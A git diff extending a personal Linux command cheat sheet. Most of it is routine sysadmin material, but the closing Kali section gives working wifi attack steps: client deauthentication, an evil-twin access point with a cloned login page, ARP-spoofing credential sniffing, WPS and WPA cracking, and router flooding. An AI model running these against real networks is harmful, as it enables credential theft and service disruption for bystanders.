@@ -3,9 +3,74 @@ LIST OF GNU/LINUX COMMANDS
 
 KERNEL
 ======
+# Compile Debian Kernel
+mkdir kernel
+cd kernel
+cp /boot/config-* .config
+mkdir debian-kernel-source
+cd debian-kernel-source
+git clone https://salsa.debian.org/kernel-team/linux.git
+git log   # check in commit messages what the latest version is on master brach. ex: 'Update to 5.3-rc2'
+cd ../
+git clone https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
+cd linux
+git checkout v5.3-rc2   # must match version from debians kernel repo above. ex: '5.3-rc2'
+cd ../debian-kernel-source/linux
+cp ../../.config .
+cp -R debian/certs ../
+sed -i 's/CONFIG_SYSTEM_TRUSTED_KEYS="debian\/certs/CONFIG_SYSTEM_TRUSTED_KEYS="..\/certs/g' .config
+debian/bin/genorig.py ../../linux
+debian/rules orig   # this should apply all debian patches
+make menuconfig   # customize your kernel settings
+fakeroot make-kpkg -j9 --initrd --append-to-version "-custom-001" kernel_image kernel_headers
+
+# Compile Debian Kernel (old)
+apt-get install linux-source-4.9
+mkdir ~/kernel && cd ~/kernel
+tar -xaf /usr/src/linux-source-4.9.tar.xz
+cp /boot/config-4.9.0-8-amd64 ~/kernel/linux-source-4.9/.config
+make menuconfig   # set your kernel configuration. arch/x86/
+cp .config config_backup
+make clean
+make distclean
+cp config_backup .config
+make deb-pkg
+
+
+# Dealing with outdated .config files
+make oldconfig
+
+# Compile a single module from Debian kernel source (see above first to get source code)
+cp /boot/config-4.9.0-8-amd64 ~/kernel/linux-source-4.9/.config
+cd ~/kernel/linux-source-4.9
+make modules_prepare
+make modules SUBDIRS=drivers/thunderbolt/
+
+
+BIOS/COREBOOT
+=============
+# Update bios to latest version
+apt-get install k3b   # CD burning package. bios updates dont work with live USB
+download ISO and use external CD/DVD writer to boot the live bios update
+
+
+GIT / GITHUB
+============
+# Rename git branch
+git branch -m old-name new-name
+git push origin :old-name new-name
+
+# Git merge release into feature branch
+git checkout feature-eks-20190221
+git fetch
+git pull orign feature-eks-20190221
+git merge origin/release_20190228
 
 NETWORKING
 ==========
+# Wireless | scan for wifi in range
+sudo iw dev wlp2s0 scan
+
 # Wireless | scan for wifi in range
 sudo iwlist wlan0 scan |grep -E "ESSID|Quality|Group Cipher|Pairwise Ciphers"
 
@@ -18,6 +83,32 @@ sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa.conf
 # Wireless | release / renew dhcp lease
 sudo dhclient -r
 sudo dhclient wlan0
+
+# tcpdump
+tcpdump -i any -A port 8125
+
+# bring up usb wireless card interface
+ip a
+sudo iwconfig
+sudo ip link set wlx6cfdb9834eba up
+sudo iw dev wlx6cfdb9834eba scan
+
+CURL
+====
+curl --header 'Cookie: X-Auth=<AUTH_TOKEN>' https://mysite.com
+curl -k  -v --resolve mydomain.alpha.k8s:9243:127.0.0.1  https://mydomain.alpha.k8s:9243
+
+SSH
+===
+# convert a dropbear key
+dropbearkey -f dropbear_rsa_host_key -y
+ssh-keygen -l -f dropbear.pub
+
+# Get RSA fingerprint
+ssh-keygen ssh-keygen -l -E sha256 -f /etc/ssh/ssh_host_blah
+
+# Compare private/public ssh key and verify they match
+ssh-keygen -y -e -f <private key>
 
 SECURITY
 ========
@@ -37,6 +128,9 @@ usbguard generate-policy > /etc/usbguard/rules.conf
 usbguard block-device 2
 usbguard allow-device 4
 
+# Generate random passwords
+pwgen -cnys <length_of_pass>
+
 # Install, configure, and check AIDE
 apt-get install aide
 aideinit
@@ -48,6 +142,51 @@ touch /root/aide-test/test1
 touch /root/aide-test/test2
 aide -c /etc/aide/aide.conf --check
 
+# Decode base64 / get full cert and key
+echo "LS0tLS1CRUdJTiBS...." |base64 -d |openssl x509 -text -noout
+
+# irssi over tor
+https://www.funtoo.org/Irssi_over_tor
+
+# securly erase a SSD
+hdparm -I /dev/sdX
+hdparm --user-master u --security-set-pass $(uuidgen) /dev/sdX
+hdparm --user-master u --security-erase <uuid> /dev/sdX
+hdparm -N /dev/sdX
+hdparm -N 1938475602 /dev/sdX
+shred -v -n 3 -z /dev/sdX
+
+# Scanners for rootkits / virus' rkhunter/chkrootkit
+sudo rkhunter --pkgmgr DPKG --check
+sudo rkhunter --update --propupd    # Only run after verifying Warnings. This says 'everythings okay'
+chklastlog
+chkrootkit -q
+
+# Common gpg commands
+gpg --with-fingerprint <keyfile>
+
+# setup gnupg to use keyserver
+apt-get install parcimonie  # slowly refreshes your keyring
+wget https://sks-keyservers.net/sks-keyservers.netCA.pem
+diff sks-keyservers.netCA.pem /usr/share/gnupg/sks-keyservers.netCA.pem   # make sure they are the same
+vi ~/.gnupg/gpg.conf
+  keyserver hkps://hkps.pool.sks-keyservers.net
+  keyserver-options ca-cert-file=/path/to/CA/sks-keyservers.netCA.pem
+  keyserver-options no-honor-keyserver-url
+
+link: https://riseup.net/en/security/message-security/openpgp/best-practices#selecting-a-keyserver-and-configuring-your-machine-to-refresh-your-keyring
+
+
+OPENSSL/CERTIFICATES/KEYS
+=========================
+# Generate self signed certificate for nginx/apache
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout selfsigned.key -out selfsigned.crt
+
+# Add a self signed cert to trusted section on debian
+cp mydomain.com.crt /usr/share/ca-certificates
+dpkg-reconfigure ca-certificates
+
+
 STORAGE / DISK
 ==============
 # Compress / backup to tar file
@@ -58,24 +197,148 @@ tar zxvf backup.tar.gz
 
 # Create bootable USB from ISO
 mkfs.vfat -F 32 /dev/sdX
-dd if=/path_to_iso_without_space.iso of=/dev/sdX && sync
+dd if=/path_to_iso_without_space.iso of=/dev/sdX && sudo sync
+
+# Create bootable USB from ISO on ANY linux machine
+insert flash drive (going to assume it is /dev/sdb)
+sudo mkdir /media/iso/
+sudo mkdir /media/usb/
+sudo mount -o loop ubuntu.iso /media/iso
+sudo mount /dev/sdb /media/usb
+cp -a /media/iso/. /media/usb/
+sudo apt-get install syslinux mtools
+sudo syslinux -s /dev/sdb1    # this may just need to be 'sdb' not 'sdb1'
+cd /media/usb
+sudo mv isolinux syslinux
+cd syslinux
+sudo mv isolinux.cfg syslinux.cfg
+cd ~
+sudo umount /dev/sdb
+
+# Shrink logical volume (lvm) and add unallocated space to pysical volume
+sudo lvresize --verbose --resizefs -L -50G /dev/vg-test/home    # before booting debian-live USB
+sudo poweroff
+boot to debian live USB
+sudo apt-get update && apt-get install gparted lvm2
+sudo gparted
+  - right click encrypted drive and decrypt it
+  - right click decrypted partition choose 'shrink'
+  - drag white free space bar all the way over to the left
+  - apply changes
+  - you now have 50G unallocated space on your physical drive.
+  - install another OS for dual booting
+
+# Shrink logical volume on home lvm (2 examples of each command)
+lvresize -L --verbose --resizefs -10G /dev/mapper/work--vg-home
+lvresize -L -10G /dev/work-vg/home
+resize2fs /dev/mapper/work--vg-root   # may not need this if '--resizefs' was specified
+resize2fs /dev/work-vg/root           # may not need this if '--resizefs' was specified
+
+# Add all free space in volume group to root lvm (2 examples of each command)
+lvresize -l +100%FREE /dev/mapper/work--vg-root
+lvresize -l +100%FREE /dev/work-vg/root
+resize2fs /dev/mapper/work--vg-root   # may not need this if '--resizefs' was specified
+resize2fs /dev/work-vg/root           # may not need this if '--resizefs' was specified
+
+
+APT/PACKAGES
+============
+# Find which repo list a package will be installed from
+apt-cache policy vim
+
+FILE MANAGMENT
+==============
+# remove/delete every file in directory except .txt files
+find . -type f ! -iname '*.txt' -delete
+
+# remove/delete every directory in directory except 'keep' directory
+find . -type d ! -iname 'keep' -delete
+
+# find and remove every file and directory except 'keep' directory
+find . ! -iname 'keep' -delete
+
 
 MISCELLANEOUS
 =============
 # Adjust brightness on laptop
 echo 2700 |sudo tee /sys/class/backlight/intel_backlight/brightness
 
+# Map keyboard keys different. Example swapping Caps_Locks and Escape keys.
+xev   # press key and get 3rd line. example below.
+    state 0x0, keycode 9 (keysym 0xff1b, Escape), same_screen YES,
+    state 0x2, keycode 66 (keysym 0xffe5, Caps_Lock), same_screen YES,
+xmodmap -e "keycode 66 = Escape"
+xmodmap -e "keycode 9 = Caps_Lock"
+
+# reset keyboard settings back to default. (may work)
+dpkg-reconfigure keyboard-configuration
+
+# linux date command
+date +"%Y-%m-%d"
+
+
+TERMINAL
+========
+# Hot-Keys for quick skipping
+- Ctrl-A: go to the beginning of line
+- Ctrl-E: go to the end of line
+- Alt-B: skip one word backward
+- Alt-F: skip one word forward
+- Ctrl-U: delete to the beginning of line
+- Ctrl-K: delete to the end of line
+- Alt-D: delete to the end of word
+
 VIM EDITOR
 ==========
 # Remove everything from cursor position to end of file
 :.,$d
 
-# Spell checking with vim
+# Delete all lines with the word 'profile'
+:g/profile/d
+
+# Delete everything to end of line except first column
+:%s/ .*//g
+
+# Delete all lines with the word 'profile' from cursor to line 20
+:.,20g/profile/d
+
+# Delete from symobol ':' to end of line
+:%s/\:.*//g
+
+# Replace new line with a comma
+:%s/\n/,/g
+
+# Spell checking with vim (vim spellcheck)
 ]s    # next word
 [s    # previous word
 z=    # list words
 zg    # mark as good
 zw    # mark as bad
+
+AWK
+===
+# print last column of the file
+awk '{print $NF;}' somefile
+
+# print 2nd colum of the file
+awk '{print $2;}' somefile
+
+# print 2nd to last column of the file
+awk '{print $(NF-1);}' somefile
+
+# set different field seperator
+awk -F ':'
+
+# print every line where 'M' is the 4th column
+awk '$4~/M/' somefile
+
+# print every line where $2 column is equal to $3 column
+awk '$2==$3' somefile
+
+# remove duplicate values with awk
+awk '{print $4}' somefile |awk '!($0 in array) {array[$0]; print}'
+
+# 
 
 SCRIPTING
 =========
@@ -93,3 +356,630 @@ curl -s https://jenkins.edgeapps.net/login?from=%2F |grep data-version \
 curl -s "https://jenkins.io/download/" |grep "Download Jenkins" -A 1 \
   |grep -v "Download Jenkins" | head -1 \
   > latest_version
+
+# export to to descendant shells
+export VAR="$(fdisk -l)"
+
+# feed subshell command into a while loop
+while read line; do
+  ./info.sh $line
+done < <(cat file.list |awk '{print $1}')
+
+
+AWS CLI
+=======
+## Request temporary access/secret key, and session token
+aws sts get-session-token --serial-number <MFA_ARN> --duration-seconds 7200 --token-code <MFA_CODE>
+
+## Curl AWS metadata for IAM role
+curl http://169.254.169.254/latest/meta-data/iam/info
+
+## Add those credentails to the ~/.aws/credentials file
+[default]
+region = us-west-2
+aws_access_key_id = <Access-key-as-in-returned-output>
+aws_secret_access_key = <Secret-access-key-as-in-returned-output>
+aws_session_token = <Session-Token-as-in-returned-output>
+
+## You can also set global environment variables instead of the config file
+export AWS_ACCESS_KEY_ID=<Access-Key-as-in-Previous-Output>
+export AWS_SECRET_ACCESS_KEY=<Secret-Access-Key-as-in-Previous-Output>
+export AWS_SESSION_TOKEN=<Session-Token-as-in-Previous-Output>
+
+# login to AWS ECR
+aws ecr get-login --no-include-email --region us-west-2
+
+# add IAM user to Group
+aws iam add-user-to-group --user-name username --group-name groupname
+
+# elb healthcheck change to force new healthcheck
+aws elb configure-health-check --load-balancer-name dev-jenkins --health-check Target=TCP:443,Interval=15,UnhealthyThreshold=2,HealthyThreshold=10,Timeout=5
+
+# get instances from auto-scaling group
+
+# set desired capacity for auto-scaling group
+aws autoscaling update-auto-scaling-group --auto-scaling-group-name my-asg-name --desired-capacity 4
+
+# describe autoscaling groups
+aws autoscaling describe-auto-scaling-groups
+aws autoscaling describe-auto-scaling-groups --auto-scaling-group-names my-asg-name --output text
+
+# terminate instance in auto-scaling group
+aws autoscaling terminate-instance-in-auto-scaling-group --no-should-decrement-desired-capacity --instance-id <instance_id>
+
+# search parameter store recursivly
+aws ssm get-parameters-by-path --recursive --with-decryption --path /alpha 
+
+
+DOCKER
+======
+
+LIBRECMC/OPENWRT
+================
+## Copy openwrt build from container to host
+sudo docker cp openwrt:/home/user/git/new/libreCMC/bin/targets/ar71xx/generic/librecmc-ar71xx-generic-tl-wdr3600-v1-squashfs-factory.bin .
+
+
+KUBERNETES/KUBECTL
+==================
+## List all api-resources available
+kubectl api-resources
+
+## explain what something does
+kubectl explain pvc.spec
+
+## Get nodes,pods,services, etc.
+kubectl get nodes
+kubectl get pods
+kubectl get services
+
+## Get domain / url for kube service
+kubectl get crd |grep knative
+kubectl get services.serving.knative.dev helloworld-nodejs -oyaml |grep domain
+
+## Diagnose pods / container. Get logs, etc.
+kubectl logs contour-internal-74b58d5f95-j7gd6 -c envoy
+kubectl exec -it contour-internal-74b58d5f95-j7gd6 -- /bin/sh
+curl http://169.254.169.254/latest/meta-data/iam/info
+
+## pull down and untar a helm chart
+helm fetch stable/cert-manager --untar
+
+## generate helm template
+helm template helloworld/ --name helloworld > helloworld.yaml
+
+## Kubernetes DNS between containers
+<svc_name>.<namespace>.svc.cluster.local
+
+AWS EKS
+=======
+## Configure kubectl for AWS EKS on your local machine
+mkdir /opt/aws-iam-authenticator && mkdir /opt/kubectl
+curl -o /opt/aws-iam-authenticator/aws-iam-authenticator https://amazon-eks.s3-us-west-2.amazonaws.com/1.10.3/2018-07-26/bin/linux/amd64/aws-iam-authenticator
+curl -o /opt/aws-iam-authenticator/aws-iam-authenticator.sha256 https://amazon-eks.s3-us-west-2.amazonaws.com/1.10.3/2018-07-26/bin/linux/amd64/aws-iam-authenticator.sha256
+curl -o /opt/kubectl/kubectl https://amazon-eks.s3-us-west-2.amazonaws.com/1.10.3/2018-07-26/bin/linux/amd64/kubectl
+curl -o /opt/kubectl/kubectl.sha256 https://amazon-eks.s3-us-west-2.amazonaws.com/1.10.3/2018-07-26/bin/linux/amd64/kubectl.sha256
+cd /opt/aws-iam-authenticator/
+sha256sum -c aws-iam-authenticator
+cd /opt/kubectl
+sha256sum -c kubectl
+echo 'export PATH=/opt/kubctl:$PATH' >> ~/.bashrc
+echo 'export PATH=/opt/aws-iam-authenticator:$PATH' >> ~/.bashrc
+
+## Access EKS cluster and apply configmap
+aws eks list-clusters
+aws eks update-kubeconfig --name <cluster_name>
+kubectl get svc
+curl -O https://amazon-eks.s3-us-west-2.amazonaws.com/1.10.3/2018-07-26/aws-auth-cm.yaml
+vi aws-auth-cm.yaml   # Replace the "<ARN of instance role (not instance profile)>" with WorkerNode IAM Role ARN
+                      # NOTE: Make sure you remove the 'roles/' from the ARN when copying from AWS Console
+kubectl apply -f aws-auth-cm.yaml
+kubectl describe configmap -n kube-system aws-auth
+kubectl get nodes --watch   # Wait for worker nodes to check-in with cluster
+
+## Adding another IAM user to the configmap
+kubectl edit -n kube-system configmap/aws-auth
+```
+apiVersion: v1
+data:
+  mapRoles: |
+    - rolearn: arn:aws:iam::555555555555:role/devel-worker-nodes-NodeInstanceRole-74RF4UBDUKL6
+      username: system:node:{{EC2PrivateDNSName}}
+      groups:
+        - system:bootstrappers
+        - system:nodes
+  mapUsers: |
+    - userarn: arn:aws:iam::555555555555:user/admin
+      username: admin
+      groups:
+        - system:masters
+    - userarn: arn:aws:iam::111122223333:user/ops-user
+      username: ops-user
+      groups:
+        - system:masters
+```
+
+## Setup the kubernetes dashboard for EKS
+kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/master/src/deploy/recommended/kubernetes-dashboard.yaml
+kubectl apply -f https://raw.githubusercontent.com/kubernetes/heapster/master/deploy/kube-config/influxdb/heapster.yaml
+kubectl apply -f https://raw.githubusercontent.com/kubernetes/heapster/master/deploy/kube-config/influxdb/influxdb.yamlkubectl apply -f https://raw.githubusercontent.com/kubernetes/heapster/master/deploy/kube-config/rbac/heapster-rbac.yaml
+vi eks-admin-service-account.yaml
+```
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: eks-admin
+  namespace: kube-system
+```
+kubectl apply -f eks-admin-service-account.yaml
+vi eks-admin-cluster-role-binding.yaml
+```
+apiVersion: rbac.authorization.k8s.io/v1beta1
+kind: ClusterRoleBinding
+metadata:
+  name: eks-admin
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+- kind: ServiceAccount
+  name: eks-admin
+  namespace: kube-system
+```
+kubectl apply -f eks-admin-cluster-role-binding.yaml
+kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep eks-admin | awk '{print $1}')  # Copy the Token
+kubectl proxy
+http://localhost:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
+paste token and login
+
+## Deploy a simple nginx application to EKS Cluster
+kubectl apply -f https://k8s.io/examples/application/deployment.yaml
+kubectl describe deployment nginx-deployment
+kubectl get pods
+kubectl describe pod <pod-name>
+
+## Setup, Install, and Configure istio
+git clone https://github.com/istio/istio.git
+cd istio/
+git checkout -b 1.0.2 tags/1.0.2
+vi istio_script.sh
+mv istio_script.sh install/kubernetes/helm/
+cd install/kubernetes/helm/
+./istio_script.sh 
+kubectl create namespace istio-system
+kubectl get namespace 
+kubectl apply -f istio-helm.yaml 
+kubectl -n istio-system get service -o wide
+kubectl apply -f https://k8s.io/examples/application/deployment.yaml   # Test a nginx pod deployment
+kubectl get pods
+
+
+DISPLAY
+=======
+# use for modifiying multiple displays
+xrandr
+xrandr --output eDP-1 --mode 1920x1080 --pos 0x0 --left-of DP-2 --output DP-2 --mode 1920x1080 --pos 0x0 --left-of HDMI-1 --right-of eDP-1 --output HDMI-1 --mode 1920x1080 --pos 0x0 --right-of DP-2
+
+# Displaylink (work in progress)
+evdi-dkms   # kernel module needed for creating virtual displays
+https://github.com/DisplayLink/evdi
+
+
+OPENBOX
+=======
+## Fix window focus issue. place at bottom of rc.xml before '</openbox_config>'
+<applications>
+  <application class="*">
+    <focus>yes</focus>
+  </application>
+</applications>
+
+VIRTSH/VIRT-INSTALL/VIRTUAL
+==========================
+## Link to good info on qemu/kvm/virt-install/virsh
+https://wiki.debian.org/KVM#Creating_a_new_guest
+
+# Create a bridge network interface for virt-manager
+https://computingforgeeks.com/how-to-create-and-configure-bridge-networking-for-kvm-in-linux/
+
+## Install new vm
+virt-install --virt-type kvm --name kali --memory 2048 --vcpus 2 --cdrom ~/Downloads/iso/kali/kali-linux-2019.3-amd64.iso --disk size=30 --os-type linux
+
+## Start virt-manager network service
+virt-manager
+Edit > Connection Details > Virtual Networks > Play button
+
+# convert image from raw to qcow2 format
+qemu-img convert -f raw -O qcow2 ~/.local/share/libvirt/images/windows.img ~/.local/share/libvirt/images/windows.qcow2
+
+# create a snapshot of 
+cd ~/.config/libvirt/qemu/snapshot
+virsh list
+virsh snapshot-create-as --domain kali --name kali-base-snapshot
+
+IPHONE
+======
+## Packages for accessing iphone via usb
+apt install ideviceinstaller python-imobiledevice libimobiledevice-utils libimobiledevice6 libplist3 python-plist ifuse usbmuxd libusbmuxd-tools
+apt-get install shotwell    # optional (i think)
+
+## Connecting your iphone to usb
+must completely uninstall usbguard and reboot. fought with this for hours
+after uninstalling reboot the computer if the iphone wont prompt to trust it
+usbmuxd -f -v     # run in first terminal. should now show iphone when running lsusb
+on iphone General > reset > reset location and privacy settings
+plug in iphone
+idevicepair pair  # run this in the second terminal. should show SUCCESS
+mkdir ~/iphone
+ifuse ~/iphone
+cd ~/iphone/DCIM
+
+# Backup everything from iphone. photos, contacts, etc.
+https://www.youtube.com/watch?v=cuTaRO6UyOE&feature=youtu.be  # good tutorial to follow
+git clone https://github.com/inflex/ideviceunback
+git clone https://github.com/inflex/ios2vcard
+cd ideviceunback
+make
+sudo mv ideviceunback /usr/local/bin/
+sudo chown root: /usr/local/bin/ideviceunback
+mkdir ~/iphone-backup
+idevicebackup2 backup ~/iphone-backup
+ideviceunback 
+
+PYTHON
+======
+## Setup virtual environment for python 3
+virtualenv -p /usr/bin/python3 .venv3
+python3 -m venv .venv
+
+## Install python 3.6.7 from source and create virtualenv
+sudo mkdir /opt/python3.6_source
+sudo chown -R user:user /opt/python3.6_source
+cd /opt/python3.6_source
+wget https://www.python.org/ftp/python/3.6.7/Python-3.6.7.tgz
+wget https://www.python.org/static/files/pubkeys.txt
+gpg --import pubkeys.txt
+virtualenv -p /opt/python3.6/bin/python3.6 .venv_3.6
+
+GPG/ENCRYPTION
+==============
+## Generate private / public gpg key
+gpg --default-new-key-algo rsa4096 --gen-key
+gpg --full-generate-key
+
+## Encrypt file with public gpg key
+gpg --output doc.gpg --encrypt --recipient blake@cyb.org doc
+gpg --encrypt --recipient blake@cyb.org doc
+
+## Decrypt a file
+gpg --output doc --decrypt doc.gpg
+gpg --decrypt doc.gpg
+
+ZOOM/VIDEO CHAT
+===============
+## zoom modifications.
+echo "usePopupShareToolbar=false" >> ~/.config/zoomus.conf
+
+JENKINS - CI/CD
+===============
+# Running jenkins locally for local development and testing
+sudo docker run -p 8080:8080 -p 50000:50000 -v jenkins_home:/var/jenkins_home -v /home/slick/git/my_project:/var/jenkins_home/git_repos/my_project --name jenkins -d jenkins/jenkins:lts
+
+# Plugins used for local development
+File System SCM
+https://stackoverflow.com/questions/45178811/jenkins-load-global-pipeline-library-from-filesystem-instead-of-scm
+
+# Configure Global Pipeline Libraries
+Manage Jenkins > Configure System > Global Pipeline Libraries
+global-pipeline-library
+Legecy SCM > File System    # must have 'File System SCM' Plugin installed
+
+# List of common plugins
+- build pipeline plugin
+- parameterized trigger plugin 
+- downstream buildview plugin
+- blue ocean plugin
+- codeship plugin
+
+VIDEO/AUDIO CONVERTER
+=====================
+# convert mpv to mkv
+HandBrakeCLI -i 1.\ Introduction.mp4 -o 1.\ Introduction.mkv -e x264 -q 20 -B 160
+
+# script to convert from .mp4 to .mkv format recursively 
+```
+#!/bin/bash
+#
+# set 'src_type' and 'dest_type' to what you want to convert to/from
+# NOTE: variables may not work and might need to be hard coded in the script
+# Example: ./convert.sh vidoe-dir
+
+src_type=".mp4"
+dest_type=".mkv"
+
+if [ -z "$1" ] ; then
+  TRANSCODEDIR="."
+else
+  TRANSCODEDIR="$1"
+fi
+  find "$TRANSCODEDIR" -iname "*${src_type}" -type f -exec bash -c 'HandBrakeCLI -i "$1" -o "${1%\.*}"${dest_type} -e x264 -q 20 -B 160' __ {} \;
+```
+
+PARSING/REGEX
+=============
+# examples
+"Value": "foobar",  # example of output
+
+# delete/remove the '"', ',' and ':' from output
+tr -d '\"|,|:'
+
+# select field number 2
+awk '{print $2}'
+
+# full command example
+cat temp.txt |grep Value |tr -d '\"|,|:' |awk '{print $2}'
+foobar    # new output 
+
+JQ/JSON
+=======
+# parse json parent object 'FileSystemId' based on child object value 'Tags[] ...'
+cat json.txt |jq -r '.FileSystems[] |{Airflow: .Tags[], FileSystemId: .FileSystemId} |select(.Airflow.Value == "mt-airflow") |.FileSystemId'
+
+
+GHIDRA/REVERSE ENGINEERING
+==========================
+# build ghidra from source
+git clone https://github.com/NationalSecurityAgency/ghidra.git
+cd ghidra
+git checkout Ghidra_9.1_build
+gradle --init-script gradle/support/fetchDependencies.gradle init
+gradle buildGhidra
+gradle eclipse
+gradle buildNatives_linux64
+gradle sleighCompile
+gradle eclipse -PeclipsePDE
+gradle prepDev
+cd
+unzip ghidra/build/dist/ghidra_9.1_DEV_*_linux64.zip
+~/ghidra_9.1_DEV/
+
+KALI LINUX
+==========
+# Enable monitor mode on wireless card
+sudo ifconfig wlp2s0 down
+sudo iwconfig wlp2s0 mode monitor
+
+# Disable monitor mode on wireless card
+airmon-ng stop mon0/wlp2s0  # not sure about this one
+sudo ifconfig mon0 down
+sudo iwconfig mon0 mode managed
+sudo iwconfig
+Mode should now show 'Managed'
+sudo ip link set mon0 promisc off
+ip a
+Interface should not show PROMISC
+
+# Scan for 5ghz band
+airodump-ng --band a mon0
+
+# Dissconnect / Deathenticate a client
+airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2 mon0   # list connected devices mac address
+aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c <insert_client_mac> mon0
+
+# Dissconnect / Deathenticate ALL clients (run both commands at same time)
+airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2 mon0
+aireplay-ng --deauth 10000000 -a 64:7C:34:A4:BB:B2 mon0
+
+# Access Hidden Networks (run last 2 commands at same time)
+airodump-ng mon0  # list all networks
+airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2 mon0   # get connected devices
+aireplay-ng --deauth 4 -a 64:7C:34:A4:BB:B2 -c <insert_client_mac> mon0   # death client
+should now show in the 'airodump-ng' command the real ESSID name
+
+# Bypass mac filtering on wireless network
+airodump-ng mon0    #list all networks
+airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2 mon0   # get connected devices
+sudo ifconfig wlp2s0 down
+sudo macchanger -m <insert_client_mac> wlp2s0
+try connecting to the network now
+
+# Bypass captive portals like hotels, airports, coffee shops, etc.
+  - change mac to one of a connected client
+  - sniff logins in monitor mode
+  - connect and sniff logins after running an arp spoofing attack
+  - create a fake AP, ask user to login
+
+# Sniffing credentials for captive portal access in monitor mode
+sudo ifconfig wlp2s0 down
+sudo iwconfig wlp2s0 mode monitor
+airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2 --write hotel mon0
+aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c <insert_client_mac> mon0   # death client to force reconnect
+Ctrl-C 'airodump-ng' command once client reconnects
+wireshark
+File > Open > hotel-01.cap
+type 'http' in search box and look for POST requests
+select POST > HTML Form URL Encoded > Form item "login"   # should show pass somewher in the POST
+
+# Sniffing captive portal login info using ARP spoofing
+connect to wifi network that wants login
+mitmf --arp --spoof -i wlp2s0 --gateway 192.168.1.1   # method 1. using mitmf
+ettercap -Tq -M arp:remote -i wlp2s0 ///    # method 2. using ettercap. wait for PASS to show
+
+# Clone a webpage and setup captive portal page
+File > Save Page As > mypage
+sudo cp ~/Download/mypage/* /var/www/html/
+cd /var/www/html
+sudo mv mypage.html index.html
+sudo service apache2 restart
+http://127.0.0.1    # should load the page
+
+# Wrap a 'form' tag around the user, pass, and login buttons if it doesnt exist
+vi index.html
+  - wrap a form tag around the user, pass login. example below
+```
+<form method="post" action="/index.html">
+  ... Username input code
+  ... Password input code
+  ... Login button code
+</form>
+```
+
+# Remove login button code if its javascript and replace with input button
+vi index.html
+  - change login button to be used as input button example below
+```
+<input type="submit" value="Log In">
+```
+
+## start - Setup fake wireless ap - start ##
+sudo apt-get install hostapd dnsmasq
+sudo service network-manager stop
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo iptable --flush
+sudo iptables --delete-chain
+sudo iptables -t nat flush
+sudo iptables -t nat --delete-chain
+sudo iptables -P FORWARD ACCEPT
+
+**dnsmasq-fakeap.conf**
+```
+# Set the wifi interface
+interface=wlp2s0
+
+# Set the IP range that can be given to clients
+dhcp-range=10.0.0.5,10.0.0.253,8h
+
+# Set gateway IP address
+dhcp-option=3,10.0.0.1
+
+# Set dns server address
+dhcp-option=6,10.0.0.1
+
+# Redirect all requests to 10.0.0.1
+address=/#/10.0.0.1
+```
+
+**hostapd.conf**
+```
+# Set wifi interface
+interface=wlp2s0
+
+# Set network name
+ssid=Name you want to give the fake wifi
+
+# Set channel
+channel=1
+
+# Set driver
+driver=nl80211
+```
+
+**/etc/apache2/sites-enabled/000-default.conf**
+```
+# Add right under "<VirtualHost *:80>" (in VirtualHost)
+  ErrorDocument 404 /
+
+# Add this to the bottom (outside VirtualHost)
+<Directory "/var/www/html">
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+```
+
+dnsmasq -C ~/Documents/fakeap/dnsmasq-fakeap.conf
+hostapd ~/Documents/fakeap/hostapd.conf
+ifconfig wlp2s0 10.0.0.1 netmask 255.255.255.0
+sudo service apache2 restart    # run if you have setup captive portal page locally
+aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c <insert_client_mac> mon0   # death client to force them to reconnect
+tshark -i wlp2s0 -w hotel.cap   # command to capture the data for when they reconnect via your fakeap
+wireshark
+File > Open > hotel.cap
+search for 'http' and look for POST
+## end - Setup fake wireless ap - end ##
+
+# Find all WPS enabled routers and crack WPS (run last 2 commands at same time)
+sudo ifconfig wlp2s0 down
+sudo iwconfig wlp2s0 mode monitor
+wash -i mon0
+reaver --bssid 64:7C:34:A4:BB:B2 --channel 11 -i mon0 -A  # run first. leave running
+aireplay-ng --fakeauth 100 -a 64:7C:34:A4:BB:B2 -h <your_machines_mac> mon0  # run second 
+
+# Unlock a locked WPS router (flood router so it reboots)
+mdk3 mon0 a -a 64:7C:34:A4:BB:B2 -m   # creates fake macs and spams router router with auth
+
+# Diagnosing reaver issues
+reaver --bssid 64:7C:34:A4:BB:B2 --channel 11 -i mon0 -A -vvv
+```
+# "Sending WSC NACK"
+# "WPS transaction failed ... re-trying last pin"
+reaver --bssid 64:7C:34:A4:BB:B2 --channel 11 -i mon0 -A --no-nacks
+
+# "Detected AP rate limiting, waiting 60 seconds before re-checking"
+```
+
+# Cracking WPA/WPA2 wifi - capture handshake (run both commands at same time)
+airodump-ng --bssid <target_wifi> --channel 1 --write wpa_handshake mon0
+aireplay-ng --deauth 4 -a <taget_wifi> -c <client_on_target_wifi> mon0
+check top right of airodump command. should show handshake
+Ctrl-C airodump command once handshake has been captured
+
+# Using crunch to generate a wpa cracking wordlist
+crunch[mind][max][characters]-t[pattern]-o[filename]  # format for crunch
+crunch 6 8 abc123 -o wordlist.txt
+crunch 6 6 abc123 -o wordlist.txt -t a@@@@b
+crunch 8 8 -o all.txt #TODO: not finished with command yet
+
+# Create a database / PMK for speeding up cracking process
+airolib-ng testdb --import passwd wordlist.txt  # Imports your wordlist into the testdb
+echo <target_essid> > test-essid.txt            # Put name of target essid into a file
+airolib-ng testdb --import essid test-essid.txt # Import the ESSID into the testdb
